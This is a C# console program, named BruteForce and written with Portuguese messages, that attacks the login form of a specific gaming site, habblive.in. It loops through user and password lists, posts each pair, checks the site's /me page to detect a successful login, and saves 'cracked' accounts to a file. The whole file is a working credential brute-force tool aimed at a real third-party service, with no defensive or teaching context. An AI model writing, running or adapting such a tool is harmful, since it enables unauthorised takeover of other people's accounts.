using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Net.Http;
using System.IO;

namespace BruteForce
{
    public class StartBrute
    {
            string url_login = "https://habblive.in/";

            private async Task TestarSenha(string user)
            {
                foreach (string passwords in File.ReadAllLines("senhas.txt"))
                {


                    HttpClient client = new HttpClient();

                    Dictionary<string, string> form = new Dictionary<string, string>();

                    form.Add("username", user);

                    form.Add("password", passwords);

                    FormUrlEncodedContent conteudo = new FormUrlEncodedContent(form);

                    await client.PostAsync(url_login, conteudo);

                    var get_me = await client.GetAsync("https://habblive.in/me");

                    string result = await get_me.Content.ReadAsStringAsync();

                if (result.Contains("/me"))
                {
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine($"[!] Usuário crackeado: {user}:{passwords}");
                    using (StreamWriter sw = new StreamWriter("acessivel.txt"))
                    {
                        sw.WriteLine($"\n{user}:{passwords}");
                    }

                }
                else
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine($"[!] Erro ao logar usuário : {user}:{passwords} ... :(");
                }


                Console.Title = $"Tentando: {user}";
            }
        }
            public async void BruteForce()
            {
                  
                foreach (string users in File.ReadAllLines("users.txt"))
                {
                    await TestarSenha(users);

                    
                }
            Console.ForegroundColor = ConsoleColor.White;
            Console.WriteLine("\n\n\n[!] BruteForce finalizado - Contas salvas no arquivo acessivel.txt ");
            Console.Title = "BruteForce finalizado";
            Console.ResetColor();
            Console.WriteLine("\nAperte enter para sair do programa...");
        }
    }
}